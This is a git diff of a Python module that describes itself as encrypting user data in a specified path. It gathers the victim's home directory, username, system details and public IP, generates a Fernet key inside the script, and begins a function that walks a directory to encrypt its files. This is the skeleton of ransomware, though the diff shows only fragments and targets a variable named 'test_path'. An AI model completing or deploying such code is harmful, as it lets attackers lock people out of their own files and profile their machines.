@@ -5,11 +5,16 @@ Description: This module is responsible for encrypting user data within the spec
 
 import os  
 from cryptography.fernet import Fernet 
-from main import key
 import requests
 import platform
 import socket
 import psutil
+
+
+#ENCRYPTION KEY 
+key = Fernet.generate_key() #KEY TO ENCRYPT AND DECRYPT 
+
+
 
 #USER INFO
 home_path =  os.path.expanduser('~')
@@ -32,6 +37,9 @@ print(system_info)
 print(public_ip)
 print(home_path)
 print(current_user)
+
+
+#ENCRYPTION PROCCESS
 
 def encrypt_path():
     for root, dirs, files in os.walk(test_path):
